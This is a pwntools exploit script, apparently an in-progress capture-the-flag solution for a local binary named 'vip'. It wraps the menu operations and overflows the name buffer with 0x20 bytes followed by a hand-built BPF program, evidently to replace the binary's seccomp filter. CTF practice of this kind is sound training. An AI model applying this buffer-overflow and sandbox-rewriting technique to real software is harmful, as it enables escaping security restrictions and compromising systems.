#!/usr/bin/env python3
from pwn import *

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

p = process(['seccomp-tools', 'dump', './vip'])

def alloc(idx):
    sa('Your choice: ', '1')
    sa('Index: ', str(idx))

def show(idx):
    sa('Your choice: ', '2')
    sa('Index: ', str(idx))

def delete(idx):
    sa('Your choice: ', '3')
    sa('Index: ', str(idx))

def edit(idx, sz, buf):
    sa('Your choice: ', '4')
    sa('Index: ', str(idx))
    sa('Size: ', str(sz))
    sa('Content: ', buf)

def vip(buf):
    sa('Your choice: ', '6')
    sa('please tell us your name: \n', buf)

# seccomp-tools asm sandbox.asm -a amd64 -f carray
# seccomp-tools asm sandbox.asm -a amd64 -f raw | seccomp-tools disasm -
bpf = [32,0,0,0,0,0,0,0,21,0,7,0,2,0,0,0,21,0,6,0,10,0,0,0,21,0,5,0,1,0,0,0,21,0,4,0,0,0,0,0,6,0,0,0,0,0,5,0,21,0,2,0,2,0,0,0,21,0,1,0,60,0,0,0,6,0,0,0,5,0,5,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0]
#gdb.attach(p, 'b *0x0000000000401389\nc')
vip('A' * 0x20 + ''.join(chr(c) for c in bpf))

p.interactive()

